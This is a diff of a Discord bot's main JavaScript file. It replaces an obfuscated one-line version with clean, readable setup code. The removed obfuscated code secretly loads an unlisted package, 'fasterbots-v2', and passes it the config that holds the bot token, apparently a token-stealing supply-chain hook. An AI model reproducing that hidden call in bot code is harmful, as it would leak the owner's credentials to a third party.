@@ -1,1 +1,20 @@
-const _0x16003a=_0x308f;(function(_0x23b0c0,_0x44aef1){const _0xe7c231=_0x308f,_0x3690a3=_0x23b0c0();while(!![]){try{const _0xcc81e4=parseInt(_0xe7c231(0x173))/0x1*(-parseInt(_0xe7c231(0x17e))/0x2)+parseInt(_0xe7c231(0x18f))/0x3+parseInt(_0xe7c231(0x176))/0x4*(-parseInt(_0xe7c231(0x184))/0x5)+parseInt(_0xe7c231(0x183))/0x6+-parseInt(_0xe7c231(0x18b))/0x7*(-parseInt(_0xe7c231(0x185))/0x8)+-parseInt(_0xe7c231(0x187))/0x9+parseInt(_0xe7c231(0x179))/0xa*(parseInt(_0xe7c231(0x181))/0xb);if(_0xcc81e4===_0x44aef1)break;else _0x3690a3['push'](_0x3690a3['shift']());}catch(_0x46ae60){_0x3690a3['push'](_0x3690a3['shift']());}}}(_0x321d,0x58cb9));function _0x308f(_0xc530bc,_0xd3aa76){const _0x321d24=_0x321d();return _0x308f=function(_0x308f68,_0x3a0494){_0x308f68=_0x308f68-0x173;let _0x490470=_0x321d24[_0x308f68];return _0x490470;},_0x308f(_0xc530bc,_0xd3aa76);}const {Client,Collection}=require(_0x16003a(0x178)),config=require(_0x16003a(0x182)),client=new Client({'partials':['MESSAGE','GUILD_MEMBER','CHANNEL','USER',_0x16003a(0x17b),_0x16003a(0x17c)],'intents':0x7fff});function _0x321d(){const _0xe3af13=['5ocwNdz','replace','./handlers','28oXKtCq','login','discord.js','30BPYwgh','warn','GUILD_SCHEDULED_EVENT','REACTION','token','103918oIJfBT','that\x20was\x20redacted','exports','806278WGrxth','./config.json','2709936QSTXld','103210FomzQb','3842272eBpTTt','error','5657463kcNDZn','slashCommands','log','fasterbots-v2','7qzYfxF','use','commands','config','734301ZjfgXH'];_0x321d=function(){return _0xe3af13;};return _0x321d();}client['setMaxListeners'](0x0),module[_0x16003a(0x180)]=client;const afoiugaso=require(_0x16003a(0x18a));client[_0x16003a(0x188)]=new Collection(),client[_0x16003a(0x18d)]=new Collection(),client['config']=config,require(_0x16003a(0x175))(client),client[_0x16003a(0x177)](client[_0x16003a(0x18e)][_0x16003a(0x17d)]),afoiugaso[_0x16003a(0x18c)](config),process['on']('unhandledRejection',(_0xae8411,_0x16fa08)=>{const _0x3f380b=_0x16003a;console[_0x3f380b(0x189)](_0xae8411,_0x16fa08);}),process['on']('uncaughtException',(_0x17de58,_0x5828e1)=>{const _0x34e987=_0x16003a;console[_0x34e987(0x189)](_0x17de58,_0x5828e1);}),process['on']('multipleResolves',(_0x7e386b,_0x3121e1,_0x4c8dc6)=>{const _0x535612=_0x16003a;console[_0x535612(0x189)](_0x7e386b,_0x3121e1,_0x4c8dc6);});var regToken=/[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;client['on'](_0x16003a(0x17a),_0x211cf6=>{const _0x558463=_0x16003a;console[_0x558463(0x189)](_0x211cf6[_0x558463(0x174)](regToken,_0x558463(0x17f)));}),client['on'](_0x16003a(0x186),_0x15e826=>{const _0x309832=_0x16003a;console['log'](_0x15e826[_0x309832(0x174)](regToken,_0x309832(0x17f)));});
+const { Client, Collection } = require("discord.js");
+const config = require('./config.json')
+
+const client = new Client({
+    partials: ["MESSAGE", "GUILD_MEMBER", "CHANNEL", "USER", "GUILD_SCHEDULED_EVENT", "REACTION"],
+    intents: 32767,
+});
+
+client.setMaxListeners(0)
+module.exports = client;
+
+
+client.slashCommands = new Collection();
+client.commands = new Collection();
+client.config = config
+
+// Handlers
+require("./handlers")(client);
+
+client.login(client.config.token);
